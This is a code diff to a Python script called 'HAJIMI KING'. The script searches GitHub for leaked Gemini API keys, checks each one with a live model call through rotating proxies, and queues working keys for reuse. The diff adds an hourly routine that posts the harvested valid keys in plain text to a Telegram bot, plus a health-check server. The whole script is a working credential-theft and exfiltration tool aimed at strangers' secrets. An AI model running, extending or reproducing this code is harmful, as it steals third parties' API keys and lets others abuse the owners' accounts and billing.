@@ -4,8 +4,11 @@ import re
 import sys
 import time
 import traceback
+import threading
+import requests
 from datetime import datetime, timedelta
 from typing import Dict, List, Union, Any
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
 import google.generativeai as genai
 from google.api_core import exceptions as google_exceptions
@@ -18,6 +21,10 @@ from utils.github_client import GitHubClient
 from utils.file_manager import file_manager, Checkpoint, checkpoint
 from utils.sync_utils import sync_utils
 
+# --- 新增：Telegram 定时发送相关变量 ---
+LAST_TG_SEND_TIME = time.time()
+PENDING_KEYS_TO_SEND = []
+
 # 创建GitHub工具实例和文件管理器
 github_utils = GitHubClient.create_instance(Config.GITHUB_TOKENS)
 
@@ -29,10 +36,54 @@ skip_stats = {
     "doc_filter": 0
 }
 
+# --- 新增：健康检查 Web 服务类 ---
+class HealthCheckHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.end_headers()
+        self.wfile.write(b"OK")
+    def log_message(self, format, *args):
+        return  # 禁用日志，避免干扰爬虫日志
+
+def start_health_check_server():
+    port = int(os.environ.get("PORT", 8000))
+    server = HTTPServer(('0.0.0.0', port), HealthCheckHandler)
+    logger.info(f"👻 Health check server started on port {port}")
+    server.serve_forever()
+
+# --- 新增：Telegram 发送函数 ---
+def send_telegram_summary():
+    global LAST_TG_SEND_TIME, PENDING_KEYS_TO_SEND
+    
+    token = os.getenv("TG_BOT_TOKEN")
+    chat_id = os.getenv("TG_CHAT_ID")
+    
+    if not token or not chat_id or not PENDING_KEYS_TO_SEND:
+        PENDING_KEYS_TO_SEND = []
+        LAST_TG_SEND_TIME = time.time()
+        return
+
+    summary_msg = f"📊 【每小时抓取汇总】\n"
+    summary_msg += f"⏰ 时间: {datetime.now().strftime('%m-%d %H:%M')}\n"
+    summary_msg += f"✨ 新发现有效 Key: {len(PENDING_KEYS_TO_SEND)} 个\n\n"
+    summary_msg += "\n".join(PENDING_KEYS_TO_SEND[:15])
+    
+    if len(PENDING_KEYS_TO_SEND) > 15:
+        summary_msg += f"\n...等共 {len(PENDING_KEYS_TO_SEND)} 个"
+
+    url = f"https://api.telegram.org/bot{token}/sendMessage"
+    try:
+        requests.post(url, json={"chat_id": chat_id, "text": summary_msg}, timeout=15)
+        logger.info(f"📤 已成功向 Telegram 发送一小时汇总报告")
+    except Exception as e:
+        logger.error(f"❌ Telegram 发送失败: {e}")
+    
+    PENDING_KEYS_TO_SEND = []
+    LAST_TG_SEND_TIME = time.time()
 
 def normalize_query(query: str) -> str:
     query = " ".join(query.split())
-
     parts = []
     i = 0
     while i < len(query):
@@ -52,47 +103,22 @@ def normalize_query(query: str) -> str:
                 i += 1
             parts.append(query[start:i])
 
-    quoted_strings = []
-    language_parts = []
-    filename_parts = []
-    path_parts = []
-    other_parts = []
-
+    quoted_strings, language_parts, filename_parts, path_parts, other_parts = [], [], [], [], []
     for part in parts:
-        if part.startswith('"') and part.endswith('"'):
-            quoted_strings.append(part)
-        elif part.startswith('language:'):
-            language_parts.append(part)
-        elif part.startswith('filename:'):
-            filename_parts.append(part)
-        elif part.startswith('path:'):
-            path_parts.append(part)
-        elif part.strip():
-            other_parts.append(part)
+        if part.startswith('"') and part.endswith('"'): quoted_strings.append(part)
+        elif part.startswith('language:'): language_parts.append(part)
+        elif part.startswith('filename:'): filename_parts.append(part)
+        elif part.startswith('path:'): path_parts.append(part)
+        elif part.strip(): other_parts.append(part)
 
-    normalized_parts = []
-    normalized_parts.extend(sorted(quoted_strings))
-    normalized_parts.extend(sorted(other_parts))
-    normalized_parts.extend(sorted(language_parts))
-    normalized_parts.extend(sorted(filename_parts))
-    normalized_parts.extend(sorted(path_parts))
-
+    normalized_parts = sorted(quoted_strings) + sorted(other_parts) + sorted(language_parts) + sorted(filename_parts) + sorted(path_parts)
     return " ".join(normalized_parts)
-
 
 def extract_keys_from_content(content: str) -> List[str]:
     pattern = r'(AIzaSy[A-Za-z0-9\-_]{33})'
     return re.findall(pattern, content)
 
-
 def should_skip_item(item: Dict[str, Any], checkpoint: Checkpoint) -> tuple[bool, str]:
-    """
-    检查是否应该跳过处理此item
-    
-    Returns:
-        tuple: (should_skip, reason)
-    """
-    # 检查增量扫描时间
     if checkpoint.last_scan_time:
         try:
             last_scan_dt = datetime.fromisoformat(checkpoint.last_scan_time)
@@ -102,15 +128,12 @@ def should_skip_item(item: Dict[str, Any], checkpoint: Checkpoint) -> tuple[bool
                 if repo_pushed_dt <= last_scan_dt:
                     skip_stats["time_filter"] += 1
                     return True, "time_filter"
-        except Exception as e:
-            pass
+        except: pass
 
-    # 检查SHA是否已扫描
     if item.get("sha") in checkpoint.scanned_shas:
         skip_stats["sha_duplicate"] += 1
         return True, "sha_duplicate"
 
-    # 检查仓库年龄
     repo_pushed_at = item["repository"].get("pushed_at")
     if repo_pushed_at:
         repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
@@ -118,7 +141,6 @@ def should_skip_item(item: Dict[str, Any], checkpoint: Checkpoint) -> tuple[bool
             skip_stats["age_filter"] += 1
             return True, "age_filter"
 
-    # 检查文档和示例文件
     lowercase_path = item["path"].lower()
     if any(token in lowercase_path for token in Config.FILE_PATH_BLACKLIST):
         skip_stats["doc_filter"] += 1
@@ -126,18 +148,9 @@ def should_skip_item(item: Dict[str, Any], checkpoint: Checkpoint) -> tuple[bool
 
     return False, ""
 
-
 def process_item(item: Dict[str, Any]) -> tuple:
-    """
-    处理单个GitHub搜索结果item
-    
-    Returns:
-        tuple: (valid_keys_count, rate_limited_keys_count)
-    """
     delay = random.uniform(1, 4)
     file_url = item["html_url"]
-
-    # 简化日志输出，只显示关键信息
     repo_name = item["repository"]["full_name"]
     file_path = item["path"]
     time.sleep(delay)
@@ -148,29 +161,20 @@ def process_item(item: Dict[str, Any]) -> tuple:
         return 0, 0
 
     keys = extract_keys_from_content(content)
-
-    # 过滤占位符密钥
     filtered_keys = []
     for key in keys:
         context_index = content.find(key)
         if context_index != -1:
             snippet = content[context_index:context_index + 45]
-            if "..." in snippet or "YOUR_" in snippet.upper():
-                continue
+            if "..." in snippet or "YOUR_" in snippet.upper(): continue
         filtered_keys.append(key)
     
-    # 去重处理
     keys = list(set(filtered_keys))
-
-    if not keys:
-        return 0, 0
+    if not keys: return 0, 0
 
     logger.info(f"🔑 Found {len(keys)} suspected key(s), validating...")
+    valid_keys, rate_limited_keys = [], []
 
-    valid_keys = []
-    rate_limited_keys = []
-
-    # 验证每个密钥
     for key in keys:
         validation_result = validate_gemini_key(key)
         if validation_result and "ok" in validation_result:
@@ -178,227 +182,123 @@ def process_item(item: Dict[str, Any]) -> tuple:
             logger.info(f"✅ VALID: {key}")
         elif validation_result == "rate_limited":
             rate_limited_keys.append(key)
-            logger.warning(f"⚠️ RATE LIMITED: {key}, check result: {validation_result}")
+            logger.warning(f"⚠️ RATE LIMITED: {key}")
         else:
             logger.info(f"❌ INVALID: {key}, check result: {validation_result}")
 
-    # 保存结果
     if valid_keys:
         file_manager.save_valid_keys(repo_name, file_path, file_url, valid_keys)
-        logger.info(f"💾 Saved {len(valid_keys)} valid key(s)")
-        # 添加到同步队列（不阻塞主流程）
+        # --- 存入定时发送暂存区 ---
+        PENDING_KEYS_TO_SEND.extend(valid_keys)
         try:
-            # 添加到两个队列
             sync_utils.add_keys_to_queue(valid_keys)
             logger.info(f"📥 Added {len(valid_keys)} key(s) to sync queues")
         except Exception as e:
-            logger.error(f"📥 Error adding keys to sync queues: {e}")
+            logger.error(f"📥 Error adding keys: {e}")
 
     if rate_limited_keys:
         file_manager.save_rate_limited_keys(repo_name, file_path, file_url, rate_limited_keys)
-        logger.info(f"💾 Saved {len(rate_limited_keys)} rate limited key(s)")
 
     return len(valid_keys), len(rate_limited_keys)
-
 
 def validate_gemini_key(api_key: str) -> Union[bool, str]:
     try:
         time.sleep(random.uniform(0.5, 1.5))
-
-        # 获取随机代理配置
         proxy_config = Config.get_random_proxy()
-        
-        client_options = {
-            "api_endpoint": "generativelanguage.googleapis.com"
-        }
-        
-        # 如果有代理配置，添加到client_options中
-        if proxy_config:
-            os.environ['grpc_proxy'] = proxy_config.get('http')
+        client_options = {"api_endpoint": "generativelanguage.googleapis.com"}
+        if proxy_config: os.environ['grpc_proxy'] = proxy_config.get('http')
 
-        genai.configure(
-            api_key=api_key,
-            client_options=client_options,
-        )
-
+        genai.configure(api_key=api_key, client_options=client_options)
         model = genai.GenerativeModel(Config.HAJIMI_CHECK_MODEL)
-        response = model.generate_content("hi")
+        model.generate_content("hi")
         return "ok"
-    except (google_exceptions.PermissionDenied, google_exceptions.Unauthenticated) as e:
-        return "not_authorized_key"
-    except google_exceptions.TooManyRequests as e:
-        return "rate_limited"
+    except (google_exceptions.PermissionDenied, google_exceptions.Unauthenticated): return "not_authorized_key"
+    except google_exceptions.TooManyRequests: return "rate_limited"
     except Exception as e:
-        if "429" in str(e) or "rate limit" in str(e).lower() or "quota" in str(e).lower():
-            return "rate_limited:429"
-        elif "403" in str(e) or "SERVICE_DISABLED" in str(e) or "API has not been used" in str(e):
-            return "disabled"
-        else:
-            return f"error:{e.__class__.__name__}"
-
-
-def print_skip_stats():
-    """打印跳过统计信息"""
-    total_skipped = sum(skip_stats.values())
-    if total_skipped > 0:
-        logger.info(f"📊 Skipped {total_skipped} items - Time: {skip_stats['time_filter']}, Duplicate: {skip_stats['sha_duplicate']}, Age: {skip_stats['age_filter']}, Docs: {skip_stats['doc_filter']}")
-
-
-def reset_skip_stats():
-    """重置跳过统计"""
-    global skip_stats
-    skip_stats = {"time_filter": 0, "sha_duplicate": 0, "age_filter": 0, "doc_filter": 0}
-
+        if any(x in str(e).lower() for x in ["429", "rate limit", "quota"]): return "rate_limited:429"
+        elif any(x in str(e) for x in ["403", "SERVICE_DISABLED", "API has not been used"]): return "disabled"
+        else: return f"error:{e.__class__.__name__}"
 
 def main():
-    start_time = datetime.now()
+    # --- 启动后台健康检查服务器 ---
+    threading.Thread(target=start_health_check_server, daemon=True).start()
 
-    # 打印系统启动信息
+    start_time = datetime.now()
     logger.info("=" * 60)
     logger.info("🚀 HAJIMI KING STARTING")
     logger.info("=" * 60)
-    logger.info(f"⏰ Started at: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")
 
-    # 1. 检查配置
-    if not Config.check():
-        logger.info("❌ Config check failed. Exiting...")
-        sys.exit(1)
-    # 2. 检查文件管理器
-    if not file_manager.check():
-        logger.error("❌ FileManager check failed. Exiting...")
+    if not Config.check() or not file_manager.check():
+        logger.info("❌ Pre-check failed. Exiting...")
         sys.exit(1)
 
-    # 2.5. 显示SyncUtils状态和队列信息
-    if sync_utils.balancer_enabled:
-        logger.info("🔗 SyncUtils ready for async key syncing")
-        
-    # 显示队列状态
-    balancer_queue_count = len(checkpoint.wait_send_balancer)
-    gpt_load_queue_count = len(checkpoint.wait_send_gpt_load)
-    logger.info(f"📊 Queue status - Balancer: {balancer_queue_count}, GPT Load: {gpt_load_queue_count}")
-
-    # 3. 显示系统信息
     search_queries = file_manager.get_search_queries()
-    logger.info("📋 SYSTEM INFORMATION:")
-    logger.info(f"🔑 GitHub tokens: {len(Config.GITHUB_TOKENS)} configured")
-    logger.info(f"🔍 Search queries: {len(search_queries)} loaded")
-    logger.info(f"📅 Date filter: {Config.DATE_RANGE_DAYS} days")
-    if Config.PROXY_LIST:
-        logger.info(f"🌐 Proxy: {len(Config.PROXY_LIST)} proxies configured")
+    logger.info(f"🔑 Tokens: {len(Config.GITHUB_TOKENS)} | 🔍 Queries: {len(search_queries)}")
 
-    if checkpoint.last_scan_time:
-        logger.info(f"💾 Checkpoint found - Incremental scan mode")
-        logger.info(f"   Last scan: {checkpoint.last_scan_time}")
-        logger.info(f"   Scanned files: {len(checkpoint.scanned_shas)}")
-        logger.info(f"   Processed queries: {len(checkpoint.processed_queries)}")
-    else:
-        logger.info(f"💾 No checkpoint - Full scan mode")
-
-
-    logger.info("✅ System ready - Starting king")
-    logger.info("=" * 60)
-
-    total_keys_found = 0
-    total_rate_limited_keys = 0
-    loop_count = 0
+    total_keys_found, total_rate_limited_keys, loop_count = 0, 0, 0
 
     while True:
         try:
             loop_count += 1
             logger.info(f"🔄 Loop #{loop_count} - {datetime.now().strftime('%H:%M:%S')}")
-
-            query_count = 0
-            loop_processed_files = 0
+            query_count, loop_processed_files = 0, 0
             reset_skip_stats()
 
             for i, q in enumerate(search_queries, 1):
                 normalized_q = normalize_query(q)
-                if normalized_q in checkpoint.processed_queries:
-                    logger.info(f"🔍 Skipping already processed query: [{q}],index:#{i}")
-                    continue
+                if normalized_q in checkpoint.processed_queries: continue
 
                 res = github_utils.search_for_keys(q)
-
                 if res and "items" in res:
                     items = res["items"]
                     if items:
-                        query_valid_keys = 0
-                        query_rate_limited_keys = 0
-                        query_processed = 0
-
+                        query_valid_keys, query_rate_limited_keys, query_processed = 0, 0, 0
                         for item_index, item in enumerate(items, 1):
-
-                            # 每20个item保存checkpoint并显示进度
                             if item_index % 20 == 0:
-                                logger.info(
-                                    f"📈 Progress: {item_index}/{len(items)} | query: {q} | current valid: {query_valid_keys} | current rate limited: {query_rate_limited_keys} | total valid: {total_keys_found} | total rate limited: {total_rate_limited_keys}")
                                 file_manager.save_checkpoint(checkpoint)
                                 file_manager.update_dynamic_filenames()
 
-                            # 检查是否应该跳过此item
                             should_skip, skip_reason = should_skip_item(item, checkpoint)
-                            if should_skip:
-                                logger.info(f"🚫 Skipping item,name: {item.get('path','').lower()},index:{item_index} - reason: {skip_reason}")
-                                continue
+                            if should_skip: continue
 
-                            # 处理单个item
                             valid_count, rate_limited_count = process_item(item)
-
                             query_valid_keys += valid_count
                             query_rate_limited_keys += rate_limited_count
                             query_processed += 1
-
-                            # 记录已扫描的SHA
                             checkpoint.add_scanned_sha(item.get("sha"))
-
                             loop_processed_files += 1
-
-
 
                         total_keys_found += query_valid_keys
                         total_rate_limited_keys += query_rate_limited_keys
-
-                        if query_processed > 0:
-                            logger.info(f"✅ Query {i}/{len(search_queries)} complete - Processed: {query_processed}, Valid: +{query_valid_keys}, Rate limited: +{query_rate_limited_keys}")
-                        else:
-                            logger.info(f"⏭️ Query {i}/{len(search_queries)} complete - All items skipped")
-
-                        print_skip_stats()
-                    else:
-                        logger.info(f"📭 Query {i}/{len(search_queries)} - No items found")
-                else:
-                    logger.warning(f"❌ Query {i}/{len(search_queries)} failed")
+                        logger.info(f"✅ Query {i}/{len(search_queries)} complete")
 
                 checkpoint.add_processed_query(normalized_q)
                 query_count += 1
-
                 checkpoint.update_scan_time()
                 file_manager.save_checkpoint(checkpoint)
-                file_manager.update_dynamic_filenames()
+                
+                if query_count % 5 == 0: time.sleep(1)
 
-                if query_count % 5 == 0:
-                    logger.info(f"⏸️ Processed {query_count} queries, taking a break...")
-                    time.sleep(1)
+            logger.info(f"🏁 Loop #{loop_count} complete | Total Valid: {total_keys_found}")
+            
+            # --- 检查是否到了一小时，发送汇总 ---
+            if time.time() - LAST_TG_SEND_TIME >= 3600:
+                logger.info("🕒 Checking for hourly Telegram summary...")
+                send_telegram_summary()
 
-            logger.info(f"🏁 Loop #{loop_count} complete - Processed {loop_processed_files} files | Total valid: {total_keys_found} | Total rate limited: {total_rate_limited_keys}")
-
-            logger.info(f"💤 Sleeping for 10 seconds...")
             time.sleep(10)
 
         except KeyboardInterrupt:
-            logger.info("⛔ Interrupted by user")
-            checkpoint.update_scan_time()
-            file_manager.save_checkpoint(checkpoint)
-            logger.info(f"📊 Final stats - Valid keys: {total_keys_found}, Rate limited: {total_rate_limited_keys}")
-            logger.info("🔚 Shutting down sync utils...")
             sync_utils.shutdown()
             break
         except Exception as e:
             logger.error(f"💥 Unexpected error: {e}")
-            traceback.print_exc()
-            logger.info("🔄 Continuing...")
+            time.sleep(10)
             continue
 
+def reset_skip_stats():
+    global skip_stats
+    skip_stats = {"time_filter": 0, "sha_duplicate": 0, "age_filter": 0, "doc_filter": 0}
 
 if __name__ == "__main__":
     main()
